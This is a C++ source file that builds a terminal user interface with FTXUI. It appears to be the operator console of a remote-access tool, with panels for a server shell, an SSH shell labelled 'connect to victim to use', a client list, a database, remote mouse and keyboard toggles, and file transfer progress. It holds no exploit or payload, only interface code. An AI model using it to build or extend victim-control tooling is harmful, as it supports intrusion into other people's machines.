#include "tui.hpp"
#include "scroller.hpp"

ftxui::Tui::Tui()
	:
	screen(ScreenInteractive::Fullscreen())
{
    //setup title
    title = Renderer([] {
        return hbox({
            text(" Waiting for startup...") | color(Color::Blue),
            }) | border;
        });

    //setup server shell panel
    server_shell_output = " Server Shell, type \"help\" for help with commands.\n \n";
    server_input = Input(&server_shell_input, "Type here...");
    server_scroller = Scroller(Renderer([&] {
        return paragraph(server_shell_output);
        }));
    server_shell = Renderer(Container::Vertical({ server_scroller, server_input }), [&] {
        return vbox({
            server_scroller->Render(),
            separator(),
            hbox({text(" > "), server_input->Render()}) | xflex,
            });
        });

    //setup ssh shell panel
    ssh_shell_output = " SSH Shell, connect to victim to use.\n \n";
    ssh_input = Input(&ssh_shell_input, "Type here...");
    ssh_scroller = Scroller(Renderer([&] {
        return paragraph(ssh_shell_output);
        }));
    ssh_shell = Renderer(Container::Vertical({ ssh_scroller, ssh_input }), [&] {
        return vbox({
            ssh_scroller->Render(),
            separator(),
            hbox({text(" > "), ssh_input->Render()}) | xflex,
            });
        });

    //setup info panels
    clients_output = "Server connection required";
    clients_scroller = Scroller(Renderer([&] {
        return paragraph(clients_output);
        }));
    clients = Renderer(clients_scroller, [&] {
        return vbox({
            separator(),
            hbox({
                filler() | size(WIDTH, EQUAL, 1),
                clients_scroller->Render()
                })
            });
        });
   
    database_output = "Server connection and admin privileges required";
    database_scroller = Scroller(Renderer([&] {
        return paragraph(database_output);
        }));
    database = Renderer(database_scroller, [&] {
        return vbox({
            separator(),
            hbox({
                filler() | size(WIDTH, EQUAL, 1),
                database_scroller->Render()
                })
            });
        });

    //setup tab for info panels
    info_tab_values = { " Clients ", " Database ", " x " };
    info_tab_menu = Toggle(&info_tab_values, &info_tab_selected);
    info_tab_container = Container::Tab({
            clients,
            database,
            Renderer([] { return filler(); })
        }, &info_tab_selected);

    //setup tab for shell panels
    shell_tab_values = { "Server", "SSH", "Blank"};
    shell_tab_menu = Menu(&shell_tab_values, &shell_tab_selected);
    shell_tab_container = Container::Tab({
            server_shell,
            ssh_shell,
			Renderer([] { return filler(); })
        }, &shell_tab_selected);

    mouse_checkbox = Checkbox("", &is_sending_mouse);
    keyboard_checkbox = Checkbox("", &is_sending_keyboard);

    //layout for event handling
    layout = Container::Vertical({
        Container::Vertical({
            info_tab_menu,
            info_tab_container,
        }),
        Container::Horizontal({
            shell_tab_menu,
            shell_tab_container,
        }),
        });

    //main layout renderer
    info_title = text("Not connected") | color(Color::Red);
    ssh_title = text("SSH (0)") | color(Color::Red);

	sending_file_status = text(" Sending: Idle ") | color(Color::GrayDark);
	getting_file_status = text(" Getting: Idle ") | color(Color::GrayDark);

    main_renderer = Renderer(layout, [&] {
        return vbox({
            title->Render() | bold,
            vbox({
                hbox({
                    info_title | xflex | bold,
                    separator(),
                    info_tab_menu->Render(),
                }) | xflex | align_right,
                info_tab_container->Render(),
            }) | border,
            hbox({
                vbox({
                    ssh_title | center | bold,
                    separator(),
                    //non interactive checkbox
                    hbox({
                        vbox({
                            mouse_checkbox->Render(),
                            keyboard_checkbox->Render()
                        }),
                        vbox({
                            text("Mouse"),
                            text("Keyboard")
                        }),
                    }),
                    separator(),
					sending_file_status | center,
					getting_file_status | center,
					separator(),
                    shell_tab_menu->Render()
                }),
                separator(),
                shell_tab_container->Render() | flex,
            }) | flex | border,
            });
        });

	server_shell->TakeFocus();
}

void ftxui::Tui::run()
{
    screen.TrackMouse(false);
    //event handling
    auto app = CatchEvent(main_renderer, [&](Event event) {
        //switch between focusable inputs using tab
        if (event == Event::Tab) {
            if (layout->ActiveChild()->Index() < layout->ChildCount() - 1)
                layout->SetActiveChild(layout->ChildAt(layout->ActiveChild()->Index() + 1));
            else
                layout->SetActiveChild(layout->ChildAt(0));

            return true;
        }

        //handle keyboard input for shell execution when shell tab is selected
        if (layout->ActiveChild()->Index() == 1 && shell_tab_container->Active()) {
            if (event == Event::Return) {
                if (shell_tab_selected == 0) {
					server_commands.push(server_shell_input);
                    server_shell_input.clear();

                    return true;
                }
                else if (shell_tab_selected == 1) {
					ssh_commands.push(ssh_shell_input);
                    ssh_shell_input.clear();

                    return true;
                }
            }
            else if (event.is_character()) {
                if (shell_tab_selected == 0) {
                    server_shell_input += event.character();
                    return true;
                }
                else if (shell_tab_selected == 1) {
                    ssh_shell_input += event.character();
                    return true;
                }
            }
            else if (event == Event::Backspace) {
                if (shell_tab_selected == 0 && server_shell_input.size() > 0) {
                    server_shell_input.erase(server_shell_input.size() - 1);
                    return true;
                }
                else if (shell_tab_selected == 1 && ssh_shell_input.size() > 0) {
                    ssh_shell_input.erase(ssh_shell_input.size() - 1);
                    return true;
                }
            }
        }
        else if (layout->ActiveChild()->Index() == 0 && info_tab_container->Active()) {
            if (event == Event::Return) {
                if (info_tab_selected == 1) {
                    int n = dynamic_cast <ScrollerBase*>(database_scroller.get())->GetSelected();
                    
                    std::string hId = database_output;
                    for (int i = 0; i < n; i++)
                        hId = hId.substr(hId.find_first_of('\n') + 1);
                    hId = hId.substr(hId.find_first_of(' ') + 1);
                    hId = hId.substr(0, hId.find_first_of(' '));
                    
                    server_shell_input += " " + hId + " ";
                    return true;
                }
            }
        }

        return false;
            });

    screen.Loop(app);
}

void ftxui::Tui::stop()
{
	screen.ExitLoopClosure()();
}

void ftxui::Tui::setTitle(std::string s)
{
    mutex.lock();
    title_string = s;
    mutex.unlock();

    screen.Post([&] {
        mutex.lock();
        title = Renderer([&] {
            return hbox({
                text(title_string) | color(Color::Blue),
                }) | border;
            });
        mutex.unlock();

        triggerRedraw();
        });
}
void ftxui::Tui::setSshTitle(Element e)
{
    mutex.lock();
    new_ssh_title = e;
    mutex.unlock();

    screen.Post([&] {
        mutex.lock();
        ssh_title = new_ssh_title;
        mutex.unlock();

        triggerRedraw();
        });
}
void ftxui::Tui::setInfoTitle(Element e)
{
    mutex.lock();
    new_info_title = e;
    mutex.unlock();

    screen.Post([&] {
        mutex.lock();
        info_title = new_info_title;
        mutex.unlock();

        triggerRedraw();
        });
}
void ftxui::Tui::setIsSendingMouse(bool b)
{
    mutex.lock();
    new_is_sending_mouse = b;
    mutex.unlock();

    screen.Post([&] {
        mutex.lock();
        is_sending_mouse = new_is_sending_mouse;
        mutex.unlock();

        triggerRedraw();
        });
}
void ftxui::Tui::setIsSendingKeyboard(bool b)
{
    mutex.lock();
    new_is_sending_keyboard = b;
    mutex.unlock();

    screen.Post([&] {
        mutex.lock();
        is_sending_keyboard = new_is_sending_keyboard;
        mutex.unlock();

        triggerRedraw();
        });
}
void ftxui::Tui::setSendingFileProgress(short p)
{
    mutex.lock();
    if (p == -1)
        new_sending_file_status = text(" Sending: Error ") | color(Color::Red);
    else if (p >= 0 && p < 100)
        new_sending_file_status = text(" Sending: " + std::to_string(p) + "% ") | color(Color::Orange1);
    else if (p == 100)
        new_sending_file_status = text(" Sending: 100% ") | color(Color::Green);
    else if (p == 101)
		new_sending_file_status = text(" Sending: Idle ") | color(Color::GrayDark);
    mutex.unlock();

    screen.Post([&] {
        mutex.lock();
        sending_file_status = new_sending_file_status;
        mutex.unlock();

        triggerRedraw();
        });
}
void ftxui::Tui::setGettingFileProgress(short p)
{
    mutex.lock();
    if (p == -1)
        new_getting_file_status = text(" Getting: Error ") | color(Color::Red);
    else if (p >= 0 && p < 100)
        new_getting_file_status = text(" Getting: " + std::to_string(p) + "% ") | color(Color::Orange1);
    else if (p == 100)
        new_getting_file_status = text(" Getting: 100% ") | color(Color::Green);
    else if (p == 101)
        new_getting_file_status = text(" Getting: Idle ") | color(Color::GrayDark);
    mutex.unlock();

    screen.Post([&] {
        mutex.lock();
        getting_file_status = new_getting_file_status;
        mutex.unlock();

        triggerRedraw();
        });
}

void ftxui::Tui::setClientsOutput(std::string s)
{
    mutex.lock();
    new_clients_output = s;
    mutex.unlock();

    screen.Post([&] {
        mutex.lock();
        clients_output = new_clients_output;
        mutex.unlock();

        triggerRedraw();
        });
}
void ftxui::Tui::setDatabaseOutput(std::string s)
{
    mutex.lock();
    new_database_output = s;
    mutex.unlock();

    screen.Post([&] {
        mutex.lock();
        database_output = new_database_output;
        mutex.unlock();

        triggerRedraw();
        });
}
void ftxui::Tui::printServerShell(std::string s)
{
    mutex.lock();
    new_server_shell_output.push(s);
    mutex.unlock();

    screen.Post([&] {
        mutex.lock();
        while (new_server_shell_output.size() > 0) {
            server_shell_output += new_server_shell_output.front();
            new_server_shell_output.pop();
        }
        mutex.unlock();

        server_scroller->Render();
        dynamic_cast <ScrollerBase*>(server_scroller.get())->ScrollToBottom();
        triggerRedraw();
        });
}
void ftxui::Tui::clearServerShell()
{
    screen.Post([&] {
        server_shell_output.clear();
        triggerRedraw();
        });
}
void ftxui::Tui::printSshShell(std::string s)
{
    mutex.lock();
    new_ssh_shell_output.push(s);
    mutex.unlock();

    screen.Post([&] {
        mutex.lock();
        while (new_ssh_shell_output.size() > 0) {
            ssh_shell_output += new_ssh_shell_output.front();
            new_ssh_shell_output.pop();
        }
        mutex.unlock();

        ssh_scroller->Render();
        dynamic_cast <ScrollerBase*>(ssh_scroller.get())->ScrollToBottom();
        triggerRedraw();
        });
}
void ftxui::Tui::clearSshShell()
{
    screen.Post([&] {
        ssh_shell_output.clear();
        triggerRedraw();
        });
}

void ftxui::Tui::triggerRedraw()
{
	screen.PostEvent(Event::Custom);
}
